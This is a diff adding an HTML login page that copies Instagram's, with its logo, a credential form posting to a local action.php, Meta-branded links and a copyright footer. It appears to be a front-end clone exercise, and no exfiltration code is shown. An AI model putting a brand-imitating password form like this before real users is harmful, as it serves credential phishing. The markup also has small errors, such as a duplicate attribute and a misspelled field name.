@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="main">
+        <form action="/action.php" onsubmit="return validateForm(event)" method="post">
+            <div class="form">
+                <img class="image" src="logo.png" alt="instagram">
+                <input type="text" oninput="onEmailChange(event)" oninput="emailString()" name="user"
+                    placeholder="Phone number username or email address">
+                <input type="password" oninput="onPasswordChange(event)" name="Passward" placeholder="Password">
+                <button class="btn" type="submit" disabled>Log In</button>
+                <p>OR</p>
+
+                <p id="validationError" style="color:red" ></p>
+                <a href="#">Forgotten your password?</a>
+            </div>
+        </form>
+        <div class="signup">
+            <P>Don't have an account? <a href="#"> Sign up </a></p>
+        </div>
+        <p class="par">Get the app.</p>
+        <div class="link">
+            <a href="#">Meta</a>
+            <a href="#">about</a>
+            <a href="#">blog</a>
+            <a href="#">jobs</a>
+            <a href="#">help</a>
+            <a href="#">API</a>
+            <a href="#"> privacy</a>
+            <a href="#">terms</a>
+            <a href="#">Top accounts</a>
+
+        </div>
+        <div class="footer">
+            <p>&copy 2022 Instagram from Meta</p>
+
+        </div>
+    </div>
+    <script src="login.js"></script>
+</body>
+
+</html>
